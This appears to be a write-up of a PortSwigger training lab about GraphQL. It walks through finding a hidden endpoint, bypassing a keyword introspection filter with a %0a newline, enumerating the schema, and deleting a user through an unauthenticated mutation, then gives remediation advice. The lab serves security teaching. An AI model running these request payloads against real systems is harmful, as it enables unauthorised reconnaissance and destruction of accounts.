# Lab: Finding a Hidden GraphQL Endpoint

**Category:** GraphQL API Vulnerabilities
**Difficulty:** Apprentice
**Lab link:** [Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)

## Overview

The GraphQL endpoint is not at the standard `/graphql` path. After discovering it via path probing, introspection is blocked by a keyword filter — but it can be bypassed by injecting a newline character. The schema reveals a `deleteOrganizationUser` mutation which is used to delete carlos and solve the lab.

## Key Concepts

- **Endpoint discovery:** GraphQL endpoints respond to `{__typename}` with `{"data":{"__typename":"query"}}` — use this as a universal probe.
- **Introspection keyword bypass:** Simple regex/string filters for `__schema` or `__type` can be bypassed with a URL-encoded newline (`%0a`) inserted after the keyword.
- **Schema-driven exploitation:** Introspection reveals the available mutations and their arguments — no guessing required.

## Exploit Flow

### Step 1 — Probe common paths with the universal probe

```
GET /api?query={__typename}
```

A `200` response with `{"data":{"__typename":"query"}}` confirms the GraphQL endpoint.

### Step 2 — Bypass introspection restrictions

Direct introspection is blocked:
```
GET /api?query={__schema{types{name}}}
→ "GraphQL introspection is not allowed, but the query contained __schema or __type"
```

Bypass with a newline after `__schema`:
```
GET /api?query={__schema%0a{types{name}}}
→ 200 OK with full type list
```

### Step 3 — Enumerate the schema

Get mutation details:
```
GET /api?query={__type%0a(name:"mutation"){fields{name,args{name,type{name,ofType{name}}}}}}
```
→ Reveals `deleteOrganizationUser(input: DeleteOrganizationUserInput)`

Get input fields:
```
GET /api?query={__type%0a(name:"DeleteOrganizationUserInput"){inputFields{name,type{name,ofType{name}}}}}
```
→ Reveals `id: Int!`

Get query fields:
```
GET /api?query={__type%0a(name:"query"){fields{name,args{name,type{name,ofType{name}}}}}}
```
→ Reveals `getUser(id: Int)`

### Step 4 — Find carlos's ID

```
GET /api?query={getUser(id:1){id,username}}
GET /api?query={getUser(id:2){id,username}}
...
```

### Step 5 — Delete carlos

```
GET /api?query=mutation{deleteOrganizationUser(input:{id:X}){user{id,username}}}
```

Lab solved.

## Remediation

- Use a proper GraphQL introspection disable flag (not a keyword string filter) — parsers handle whitespace and newlines before the fix can.
- Restrict GraphQL endpoint paths and don't expose them under guessable routes.
- Apply authentication to all GraphQL mutations, especially destructive ones like `deleteOrganizationUser`.

## Key Takeaways

- `{__typename}` is the universal GraphQL endpoint fingerprint.
- Keyword-based introspection blocks are trivially bypassed — use the server's built-in disable flag.
- Always fully map a GraphQL schema before exploiting — mutations reveal the attack surface.
